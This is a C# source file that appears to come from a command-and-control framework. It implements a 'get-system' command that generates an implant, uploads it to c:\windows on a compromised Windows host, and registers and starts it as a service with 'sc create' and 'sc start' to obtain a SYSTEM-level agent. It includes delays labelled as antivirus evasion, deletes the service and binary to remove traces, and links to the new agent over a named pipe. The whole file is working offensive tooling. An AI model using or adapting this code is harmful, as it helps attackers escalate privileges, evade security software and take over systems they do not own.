using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Common.Payload;
using Shared;

namespace Common.Command.Custom
{
    public class GetSystemCommandOptions
    {
        [CommandOption("-b", "--endpoint", "EndPoint to Bind To", null)]
        public string endpoint { get; set; }

        [CommandOption("-v", "--verbose", "Show details of the command execution.")]
        public bool verbose { get; set; }

        [CommandOption("-n", "--pipe", "Name of the pipe used to pivot.", "localsys")]
        public string pipe { get; set; }

        [CommandOption("-f", "--file", "Name of payload.", null)]
        public string file { get; set; }

        [CommandOption("-p", "--path", "Name of the folder to upload the payload.", "c:\\windows")]
        public string path { get; set; }

        [CommandOption("-s", "--service", "Name of service.", "syssvc")]
        public string service { get; set; }

        [CommandOption("-i", "--inject", "If the payload should be an injector")]
        public bool inject { get; set; }

        [CommandOption("-id", "--injectDelay", "Delay before injection (AV evasion)", 30)]
        public int injectDelay { get; set; }

        [CommandOption("-ip", "--injectProcess", "Process path used for injection", null)]
        public string injectProcess { get; set; }

        [CommandOption("-x86", "--x86", "Generate a x86 architecture executable")]
        public bool x86 { get; set; }
    }

    public class GetSystemCommand : CustomCommand<GetSystemCommandOptions>
    {
        public override string Name => "get-system";

        public override string Description => "Obtain system agent using Services";

        public override OsType[] SupportedOs => new OsType[] { OsType.Windows };


        protected override async Task<bool> Run(CommandExecutionContext<GetSystemCommandOptions> context)
        {
            var options = context.Options;
            var commander = context.Commander;
            var agent = context.Agent;

            if (agent.Metadata.Integrity != Shared.IntegrityLevel.High)
            {
                commander.WriteError($"[X] Agent should be in High integrity context!");
                return false;
            }

            if (string.IsNullOrEmpty(options.endpoint))
            {
                options.endpoint = $"pipe://*:{options.pipe}";
                commander.WriteLine($"No Endpoint selected, taking the current agent enpoint ({options.endpoint})");
            }

            var endpoint = ConnexionUrl.FromString(options.endpoint);
            if (!endpoint.IsValid)
            {
                commander.WriteError($"[X] EndPoint is not valid !");
                return false;
            }

            var payloadOptions = new ImplantConfig()
            {
                //StoreImplant = false,
                Architecture =  agent.Metadata.Architecture == "x86" ? ImplantArchitecture.x86 : ImplantArchitecture.x64,
                Endpoint = endpoint,
                IsDebug = false,
                IsVerbose = options.verbose,
                //ServerKey = config.ServerConfig.Key,
                Type = ImplantType.Service,
                //InjectionDelay = options.injectDelay,
                //IsInjected = options.inject,
                //InjectionProcess = options.injectProcess
            };

            if (!string.IsNullOrEmpty(options.injectProcess))
                payloadOptions.InjectionProcess = options.injectProcess;

            commander.WriteInfo($"[>] Generating Payload!");
            var implant = await commander.GeneratePayload(payloadOptions);
            if (implant == null)
                commander.WriteError($"[X] Generation Failed!");
            else
                commander.WriteSuccess($"[+] Generation succeed!");

            commander.WriteLine($"Preparing to upload the file...");

            var fileName = string.IsNullOrEmpty(options.file) ? implant.Config.ImplantName + ".exe" : options.file;
            if (Path.GetExtension(fileName).ToLower() != ".exe")
                fileName += ".exe";

            string path = options.path + (options.path.EndsWith('\\') ? String.Empty : '\\') + fileName;

            agent.Echo($"Downloading file {fileName} to {path}");
            agent.Upload(Convert.FromBase64String(implant.Data), path);
            agent.Delay(1);
            agent.Echo($"Creating service");
            agent.Shell($"sc create {options.service} binPath= \"{path}\"");
            agent.Echo($"Starting service");
            agent.Shell($"sc start {options.service}");

            agent.Delay(20);
            if (!options.inject)
            {
                agent.Echo($"Removing service");
                agent.Shell($"sc delete {options.service}");
                agent.Echo($"[!] Don't forget to remove service binary after use! : del {path}");
            }
            else
            {
                agent.Echo($"Waiting {options.injectDelay + 10}s to evade antivirus");
                agent.Delay(options.injectDelay + 10);
                agent.Echo($"Removing service");
                agent.Shell($"sc delete {options.service}");
                agent.Echo($"Removing injector {path}");
                agent.DeleteFile(path);
            }

            agent.Echo($"[*] Execution done!");
            agent.Echo(Environment.NewLine);

            if (endpoint.Protocol == ConnexionType.NamedPipe)
            {
                agent.Echo($"Linking to pipe://127.0.0.1:{options.pipe}");
                var targetEndPoint = ConnexionUrl.FromString($"pipe://127.0.0.1:{options.pipe}");
                agent.Link(targetEndPoint);
            }

            //if (options.inject)
            //    commander.WriteInfo($"Due to AV evasion, agent can take a couple of minutes to check-in...");
            return true;
        }
    }
}
